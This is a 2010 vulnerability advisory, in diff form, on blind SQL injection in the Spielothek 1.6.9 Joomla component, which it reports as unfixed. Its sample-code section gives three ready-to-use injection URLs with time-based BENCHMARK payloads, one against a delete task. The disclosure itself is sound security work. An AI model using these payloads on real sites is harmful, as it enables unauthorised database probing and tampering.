@@ -1,0 +1,74 @@
+Spielothek 1.6.9 Joomla Component Multiple Blind SQL Injection
+
+ Name              Spielothek
+ Vendor            http://www.spielban.de
+ Versions Affected 1.6.9
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2010-07-31
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+________________________
+
+This  component  allows  you  to  present  your  users a
+highscore-enabled game-area.It is based on the all known
+joomlaflashgames, but with more features and with better
+scoring method. You  can create own categories for games
+and  let  your  site-visitors  have fun,  so  they  will
+return.
+
+
+II. DESCRIPTION
+_______________
+
+Some parameters  are not properly sanitised before being
+used in SQL queries.
+
+
+III. ANALYSIS
+_____________
+
+Summary:
+
+ A) Multiple Blind SQL Injection
+ 
+
+A) Multiple Blind SQL Injection
+_______________________________
+
+Many  parameters  in  various  files such as battle.php,
+scores.php  etc. are not properly sanitised before being
+used in SQL queries.  Because  of the number of flaws, I
+can't report the entire vulnerable code;  but  I can say
+that  most  of the numeric fields have not been properly
+checked.
+
+
+IV. SAMPLE CODE
+_______________
+
+A) Multiple Blind SQL Injection
+
+http://site/path/index.php?option=com_spielothek&task=savebattle&bid=-1 OR (SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
+
+http://site/path/index.php?option=com_spielothek&view=battle&wtbattle=play&bid=-1 OR (SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
+
+http://site/path/index.php?option=com_spielothek&view=battle&wtbattle=ddbdelete&dbtable=vS&loeschen[0]=-1 OR (SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
+
+
+V. FIX
+______
+
+No fix.
+
